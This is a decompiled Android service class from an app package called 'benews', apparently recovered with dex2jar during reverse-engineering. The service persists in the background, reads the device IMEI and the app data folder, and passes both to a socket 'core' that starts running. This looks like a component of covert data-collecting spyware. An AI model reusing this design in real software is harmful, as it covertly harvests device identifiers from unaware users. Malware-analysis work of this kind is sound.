package org.benews;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.support.v4.content.LocalBroadcastManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PullIntentService extends Service {
  private static final String TAG = "PullIntentService";
  
  private BackgroundSocket core;
  
  private String imei;
  
  private String saveFolder;
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public void onCreate() {
    super.onCreate();
    Intent intent2 = new Intent(getApplicationContext(), PullIntentService.class);
    getApplicationContext().startService(intent2);
    if (getApplicationContext().checkCallingPermission("android.permission.INTERNET") != 0)
      Log.d("PullIntentService", "Permission INTERNET not acquired"); 
    if (getApplicationContext().checkCallingPermission("android.permission.READ_PHONE_STATE\"") != 0)
      Log.d("PullIntentService", "Permission READ_PHONE_STATE not acquired"); 
    if (getApplicationContext().checkCallingPermission("android.permission.WRITE_EXTERNAL_STORAGE") != 0)
      Log.d("PullIntentService", "Permission WRITE_EXTERNAL_STORAGE not acquired"); 
    PackageManager packageManager = getPackageManager();
    String str = getPackageName();
    try {
      this.saveFolder = (packageManager.getPackageInfo(str, 0)).applicationInfo.dataDir;
      this.imei = ((TelephonyManager)getSystemService("phone")).getDeviceId();
    } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {
      Log.w("PullIntentService", "Error Package name not found ", (Throwable)nameNotFoundException);
    } 
    this.core = BackgroundSocket.newCore(this);
    this.core.setDumpFolder(this.saveFolder);
    this.core.setSerializeFolder(getApplicationContext().getFilesDir());
    this.core.setImei(this.imei);
    this.core.setAssets(getResources().getAssets());
    this.core.Start();
    Intent intent1 = new Intent("upAndRunning");
    intent1.putExtra("message", "data");
    LocalBroadcastManager.getInstance((Context)this).sendBroadcast(intent1);
  }
  
  public void onDestroy() {
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    super.onStartCommand(paramIntent, paramInt1, paramInt2);
    return 1;
  }
}


/* Location:              /home/fahim/Desktop/benews-dex2jar.jar!/org/benews/PullIntentService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */